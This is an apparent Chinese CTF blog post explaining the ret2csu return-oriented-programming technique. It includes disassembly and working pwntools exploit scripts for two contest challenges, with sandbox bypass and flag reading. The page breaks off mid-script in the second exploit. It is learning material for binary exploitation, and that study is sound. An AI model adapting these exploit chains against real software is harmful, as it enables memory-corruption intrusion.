<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ret2csu | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>ret2csu</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-11-09T21:44:19.000Z" id="date"> 2023-11-09</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-12-20T09:06:02.251Z" id="updated"> 2023-12-20</time></div></span></div></div><hr><div id="post-content"><p>最近才见到一题用csu解题的<br>顺便整理一波<br>做栈题经常能看见__libc_csu_init这个函数，能不能加以利用呢</p>
<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。<br>这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。<br>这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。<br>__libc_csu_init in IDA</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000400900</span>                               ; <span class="hljs-type">void</span> __fastcall _libc_csu_init(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, __int64, __int64)<br>.text:<span class="hljs-number">0000000000400900</span>                               public __libc_csu_init<br>.text:<span class="hljs-number">0000000000400900</span>                               __libc_csu_init proc near               ; DATA XREF: _start+<span class="hljs-number">16</span>↑o<br>.text:<span class="hljs-number">0000000000400900</span>                               ; __unwind &#123;<br>.text:<span class="hljs-number">0000000000400900</span> <span class="hljs-number">41</span> <span class="hljs-number">57</span>                         push    r15<br>.text:<span class="hljs-number">0000000000400902</span> <span class="hljs-number">41</span> <span class="hljs-number">56</span>                         push    r14<br>.text:<span class="hljs-number">0000000000400904</span> <span class="hljs-number">49</span> <span class="hljs-number">89</span> D7                      mov     r15, rdx<br>.text:<span class="hljs-number">0000000000400907</span> <span class="hljs-number">41</span> <span class="hljs-number">55</span>                         push    r13<br>.text:<span class="hljs-number">0000000000400909</span> <span class="hljs-number">41</span> <span class="hljs-number">54</span>                         push    r12<br>.text:<span class="hljs-number">000000000040090B</span> <span class="hljs-number">4</span>C <span class="hljs-number">8</span>D <span class="hljs-number">25</span> <span class="hljs-number">7</span>E <span class="hljs-number">04</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span>          lea     r12, __frame_dummy_init_array_entry<br>.text:<span class="hljs-number">0000000000400912</span> <span class="hljs-number">55</span>                            push    rbp<br>.text:<span class="hljs-number">0000000000400913</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">2</span>D <span class="hljs-number">7</span>E <span class="hljs-number">04</span> <span class="hljs-number">20</span> <span class="hljs-number">00</span>          lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:<span class="hljs-number">000000000040091</span>A <span class="hljs-number">53</span>                            push    rbx<br>.text:<span class="hljs-number">000000000040091B</span> <span class="hljs-number">41</span> <span class="hljs-number">89</span> FD                      mov     r13d, edi<br>.text:<span class="hljs-number">000000000040091</span>E <span class="hljs-number">49</span> <span class="hljs-number">89</span> F6                      mov     r14, rsi<br>.text:<span class="hljs-number">0000000000400921</span> <span class="hljs-number">4</span>C <span class="hljs-number">29</span> E5                      sub     rbp, r12<br>.text:<span class="hljs-number">0000000000400924</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> EC <span class="hljs-number">08</span>                   sub     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">0000000000400928</span> <span class="hljs-number">48</span> C1 FD <span class="hljs-number">03</span>                   sar     rbp, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">000000000040092</span>C E8 <span class="hljs-number">4F</span> FD FF FF                call    _init_proc<br>.text:<span class="hljs-number">000000000040092</span>C<br>.text:<span class="hljs-number">0000000000400931</span> <span class="hljs-number">48</span> <span class="hljs-number">85</span> ED                      test    rbp, rbp<br>.text:<span class="hljs-number">0000000000400934</span> <span class="hljs-number">74</span> <span class="hljs-number">20</span>                         jz      <span class="hljs-type">short</span> loc_400956<br>.text:<span class="hljs-number">0000000000400934</span><br>.text:<span class="hljs-number">0000000000400936</span> <span class="hljs-number">31</span> DB                         xor     ebx, ebx<br>.text:<span class="hljs-number">0000000000400938</span> <span class="hljs-number">0F</span> <span class="hljs-number">1F</span> <span class="hljs-number">84</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       nop     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br>.text:<span class="hljs-number">0000000000400938</span><br>.text:<span class="hljs-number">0000000000400940</span><br>.text:<span class="hljs-number">0000000000400940</span>                               loc_400940:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>↓j<br>.text:<span class="hljs-number">0000000000400940</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> FA                      mov     rdx, r15<br>.text:<span class="hljs-number">0000000000400943</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> F6                      mov     rsi, r14<br>.text:<span class="hljs-number">0000000000400946</span> <span class="hljs-number">44</span> <span class="hljs-number">89</span> EF                      mov     edi, r13d<br>.text:<span class="hljs-number">0000000000400949</span> <span class="hljs-number">41</span> FF <span class="hljs-number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="hljs-number">600</span>D90h)[r12+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">0000000000400949</span><br>.text:<span class="hljs-number">000000000040094</span>D <span class="hljs-number">48</span> <span class="hljs-number">83</span> C3 <span class="hljs-number">01</span>                   add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000400951</span> <span class="hljs-number">48</span> <span class="hljs-number">39</span> DD                      cmp     rbp, rbx<br>.text:<span class="hljs-number">0000000000400954</span> <span class="hljs-number">75</span> EA                         jnz     <span class="hljs-type">short</span> loc_400940<br>.text:<span class="hljs-number">0000000000400954</span><br>.text:<span class="hljs-number">0000000000400956</span><br>.text:<span class="hljs-number">0000000000400956</span>                               loc_400956:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">34</span>↑j<br>.text:<span class="hljs-number">0000000000400956</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> C4 <span class="hljs-number">08</span>                   add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040095</span>A <span class="hljs-number">5B</span>                            pop     rbx<br>.text:<span class="hljs-number">000000000040095B</span> <span class="hljs-number">5</span>D                            pop     rbp<br>.text:<span class="hljs-number">000000000040095</span>C <span class="hljs-number">41</span> <span class="hljs-number">5</span>C                         pop     r12<br>.text:<span class="hljs-number">000000000040095</span>E <span class="hljs-number">41</span> <span class="hljs-number">5</span>D                         pop     r13<br>.text:<span class="hljs-number">0000000000400960</span> <span class="hljs-number">41</span> <span class="hljs-number">5</span>E                         pop     r14<br>.text:<span class="hljs-number">0000000000400962</span> <span class="hljs-number">41</span> <span class="hljs-number">5F</span>                         pop     r15<br>.text:<span class="hljs-number">0000000000400964</span> C3                            retn<br>.text:<span class="hljs-number">0000000000400964</span>                               ; &#125; <span class="hljs-comment">// starts at 400900</span><br>.text:<span class="hljs-number">0000000000400964</span><br>.text:<span class="hljs-number">0000000000400964</span>                               __libc_csu_init endp<br></code></pre></td></tr></table></figure>
<p>first_csu</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000400956</span>                               loc_400956:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">34</span>↑j<br>.text:<span class="hljs-number">0000000000400956</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> C4 <span class="hljs-number">08</span>                   add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040095</span>A <span class="hljs-number">5B</span>                            pop     rbx<br>.text:<span class="hljs-number">000000000040095B</span> <span class="hljs-number">5</span>D                            pop     rbp<br>.text:<span class="hljs-number">000000000040095</span>C <span class="hljs-number">41</span> <span class="hljs-number">5</span>C                         pop     r12<br>.text:<span class="hljs-number">000000000040095</span>E <span class="hljs-number">41</span> <span class="hljs-number">5</span>D                         pop     r13<br>.text:<span class="hljs-number">0000000000400960</span> <span class="hljs-number">41</span> <span class="hljs-number">5</span>E                         pop     r14<br>.text:<span class="hljs-number">0000000000400962</span> <span class="hljs-number">41</span> <span class="hljs-number">5F</span>                         pop     r15<br>.text:<span class="hljs-number">0000000000400964</span> C3                            retn<br></code></pre></td></tr></table></figure>
<p>second_csu</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000400940</span>                               loc_400940:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>↓j<br>.text:<span class="hljs-number">0000000000400940</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> FA                      mov     rdx, r15<br>.text:<span class="hljs-number">0000000000400943</span> <span class="hljs-number">4</span>C <span class="hljs-number">89</span> F6                      mov     rsi, r14<br>.text:<span class="hljs-number">0000000000400946</span> <span class="hljs-number">44</span> <span class="hljs-number">89</span> EF                      mov     edi, r13d<br>.text:<span class="hljs-number">0000000000400949</span> <span class="hljs-number">41</span> FF <span class="hljs-number">14</span> DC                   call    ds:(__frame_dummy_init_array_entry - <span class="hljs-number">600</span>D90h)[r12+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">0000000000400949</span><br>.text:<span class="hljs-number">000000000040094</span>D <span class="hljs-number">48</span> <span class="hljs-number">83</span> C3 <span class="hljs-number">01</span>                   add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000400951</span> <span class="hljs-number">48</span> <span class="hljs-number">39</span> DD                      cmp     rbp, rbx<br>.text:<span class="hljs-number">0000000000400954</span> <span class="hljs-number">75</span> EA                         jnz     <span class="hljs-type">short</span> loc_400940<br></code></pre></td></tr></table></figure>
<p>在first_csu，我们可以靠栈溢出的数据构造来控制rbx,rbp,r12,r13,r14,r15 寄存器的数据<br>在second_csu，r15赋值给rdx，r14赋值给rsi，r13d赋值给edi<br>（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0<br>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位）</p>
<p>在0x40094D<br>我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行loc_400940，<br>进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1</p>
<p>手搓</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ret2csu</span>(<span class="hljs-params">rbx,rbp,r12,r13,r14,r15</span>):<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span>*(padding)<br>    payload += p64(first_csu)<br>    payload += p64(rbx)+p64(rbp)<span class="hljs-comment">#一般：rbx = 0 ,rbp = 1</span><br>    payload += p64(r12) <span class="hljs-comment">#call.addr</span><br>    payload += p64(r13) + p64(r14) + p64(r15) <span class="hljs-comment">#三个参数</span><br>    payload += p64(second_csu)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span>*( <span class="hljs-number">7</span> * <span class="hljs-number">8</span> )<br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
<p>pwntools集成(stack privoting_version)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>r = ROP(binary_file)<br>r.ret2csu(edi=<span class="hljs-number">0</span>, rsi=<span class="hljs-number">0x601038</span>, rdx=<span class="hljs-number">0x200</span>, rbp=<span class="hljs-number">0x601038</span>, call=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>payload += r.chain()<br>payload += p64(leave_ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.send(payload)<br></code></pre></td></tr></table></figure>

<hr>
<p>[鹏城杯2023 silent]<br>checksec,full relro</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">[*] <span class="hljs-string">&#x27;/mnt/Desktop/鹏城/silent/silent&#x27;</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></table></figure>
<p>开了沙盒<br>程序很简单,很多函数都没法复用<br>有csu，能用read</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-40h] BYREF</span><br><br>  init_seccomp();<br>  alarm(<span class="hljs-number">0x1E</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>ret2csu改stdin为read<br>多次call read来泄露libc<br>并写入orw的shellcode<br>看wp是1&#x2F;4096的概率打通</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64,u64<br>binary = ELF(<span class="hljs-string">&quot;./silent&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-comment">#p = process(&quot;./silent&quot;)</span><br>    p=remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>,<span class="hljs-number">9999</span>)<br>    <span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>    context.log_level = <span class="hljs-string">&#x27;error&#x27;</span><br>    <span class="hljs-comment"># pause()</span><br>    pop_rdi = <span class="hljs-number">0x0000000000400963</span><br>    pop_rsi_r15 = <span class="hljs-number">0x0000000000400961</span><br>    mov_rax_got = <span class="hljs-number">0x0000000000400869</span><br>    leave_ret = <span class="hljs-number">0x0000000000400876</span>  <br><br>    payload  = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span><br>    context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>    r = ROP(binary)<br>    r.ret2csu(edi=<span class="hljs-number">0</span>, rsi=<span class="hljs-number">0x601038</span>, rdx=<span class="hljs-number">0x110</span>, rbp=<span class="hljs-number">0x601038</span>, call=binary.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    payload += r.chain()<br>    payload += p64(leave_ret)<br>    payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    p.send(payload)<br><br>    jmp_rbp = <span class="hljs-number">0x0000000000400a93</span>    <span class="hljs-comment"># : jmp qword ptr [rbp]; </span><br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span><br>    r = ROP(binary)<br>    r.ret2csu(edi=<span class="hljs-number">0</span>, rsi=<span class="hljs-number">0x601030</span>, rdx=<span class="hljs-number">3</span>, rbp=<span class="hljs-number">0x601030</span>, call=binary.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    payload += r.chain()<br>    payload += p64(pop_rdi)<br>    payload += p64(<span class="hljs-number">0x600fd8</span>)<span class="hljs-comment">#[0x600fd8] alarm@GLIBC_2.2.5 -&gt; 0x7ffff7e772c0 (alarm) ◂— mov eax, 0x25</span><br>    payload += p64(jmp_rbp)<br>    r = ROP(binary)<br>    r.ret2csu(edi=<span class="hljs-number">0</span>, rsi=<span class="hljs-number">0x601148</span>, rdx=<span class="hljs-number">0x100</span>, rbp=<span class="hljs-number">0x601030</span>, call=binary.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    payload += r.chain()<br>    p.send(payload)<br>    <span class="hljs-comment"># pause()</span><br>    <span class="hljs-comment"># sleep(0.5)</span><br>    p.send(<span class="hljs-string">b&#x27;\x70\x29\x84&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        libc = u64(p.recvline(timeout=<span class="hljs-number">1</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xe44f0</span><br>    <span class="hljs-keyword">except</span>:<br>        p.close()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> libc &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span><br>        success(<span class="hljs-string">f&quot;libc: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc)&#125;</span>&quot;</span>)<br>        pop_rsi = libc + <span class="hljs-number">0x0000000000023a6a</span><br>        pop_rdx = libc + <span class="hljs-number">0x0000000000001b96</span><br>        ret = <span class="hljs-number">0x0000000000400696</span><br>        flag_str = <span class="hljs-number">0x6011e0</span><br>        <span class="hljs-comment"># payload = p64(one_gadget)</span><br>        payload = p64(pop_rdi)<br>        payload += p64(flag_str)<br>        payload += p64(pop_rsi)<br>        payload += p64(<span class="hljs-number">0</span>)<br>        payload += p64(libc + <span class="hljs-number">0x10fbf0</span>) <span class="hljs-comment"># open</span><br><br>        payload += p64(pop_rdi)<br>        payload += p64(<span class="hljs-number">3</span>)<br>        payload += p64(pop_rsi)<br>        payload += p64(flag_str)<br>        payload += p64(pop_rdx)<br>        payload += p64(<span class="hljs-number">0x100</span>)<br>        payload += p64(libc + <span class="hljs-number">0x110020</span>) <span class="hljs-comment"># read</span><br><br>        payload += p64(pop_rdi)<br>        payload += p64(<span class="hljs-number">1</span>)<br>        payload += p64(pop_rsi)<br>        payload += p64(flag_str)<br>        payload += p64(pop_rdx)<br>        payload += p64(<span class="hljs-number">0x100</span>)<br>        payload += p64(libc + <span class="hljs-number">0x1100f0</span>) <span class="hljs-comment"># write</span><br><br>        payload += <span class="hljs-string">b&#x27;./flag&#x27;</span><br>        <span class="hljs-comment"># pause()</span><br>        sleep(<span class="hljs-number">1</span>)<br>        p.send(payload)<br>        p.interactive()<br>        p.close()<br>        exit(<span class="hljs-number">0</span>)<br><br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;try: <span class="hljs-subst">&#123;count&#125;</span>&quot;</span>)<br>    count += <span class="hljs-number">1</span><br>    exploit()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<hr>
<p>[DASCTF11月月赛(2023) A_Sad_story]<br>开了pie<br class='item-img' data-src='/2023/11/10/ret2csu/1.png'><img src="/2023/11/10/ret2csu/1.png"><br>直接看主要的漏洞点，这里有个选择<br class='item-img' data-src='/2023/11/10/ret2csu/2.png'><img src="/2023/11/10/ret2csu/2.png"><br>选一可以拿到基址<br class='item-img' data-src='/2023/11/10/ret2csu/3.png'><img src="/2023/11/10/ret2csu/3.png"><br>选二可以有次溢出（长度几乎无限制）<br class='item-img' data-src='/2023/11/10/ret2csu/4.png'><img src="/2023/11/10/ret2csu/4.png"><br>但是走完会有段sandbox<br class='item-img' data-src='/2023/11/10/ret2csu/sand.png'><img src="/2023/11/10/ret2csu/sand.png"><br><br>直接上exp，记录这波sandbox的绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./challenge&#x27;</span>)      <br><br>p = process(<span class="hljs-string">&quot;./challenge&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;, 28133)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elf_base</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    value = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1249</span><br>    <span class="hljs-keyword">return</span> value<br><br>elf.address = elf_base()<br>success(<span class="hljs-string">&quot;elf--&gt; %s&quot;</span> + <span class="hljs-built_in">hex</span>(elf.address))<br><br>csu1 = elf.address + <span class="hljs-number">0x1620</span><br>csu2 = elf.address + <span class="hljs-number">0x163a</span><br><br>offset = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><br><span class="hljs-comment"># 